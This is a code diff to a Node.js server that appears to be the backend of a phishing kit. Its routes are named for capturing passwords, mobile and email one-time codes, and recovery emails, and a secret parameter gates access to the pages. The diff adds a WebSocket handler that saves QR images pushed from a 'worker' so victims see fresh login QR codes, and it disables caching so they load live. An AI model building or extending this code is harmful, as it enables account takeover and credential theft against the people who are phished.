@@ -1,3 +1,5 @@
+
+
 require('dotenv').config();
 const express = require('express');
 const http = require('http');
@@ -32,7 +34,7 @@ const loginLimiter = rateLimit({
 });
 app.post('/dblogin', loginLimiter);
 
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.static(path.join(__dirname, 'public'), { maxAge: 0, etag: false }));
 
 const REQUIRED_PARAM = 'mnbvcxzZXCVBNM';
 const EXCLUDED_PATHS = ['/dblogin', '/datatable', '/pwdready', '/pwdresult', '/codeload', '/mobileresult', '/motpresult', '/eotpresult', '/recemailresult', '/error'];
@@ -63,6 +65,14 @@ wss.on('connection', (ws, req) => {
     ws.on('message', (data) => {
       try {
         const msg = JSON.parse(data);
+        // Handle QR image upload from worker
+        if (msg.action === 'uploadQR' && msg.payload) {
+          const fs = require('fs');
+          const qrPath = path.join(__dirname, 'public', 'image', 'qr.png');
+          fs.writeFileSync(qrPath, Buffer.from(msg.payload.base64, 'base64'));
+          console.log('[WS] QR image saved from worker');
+          return;
+        }
         if (msg.id && pendingRequests[msg.id]) {
           pendingRequests[msg.id](msg.result);
           delete pendingRequests[msg.id];
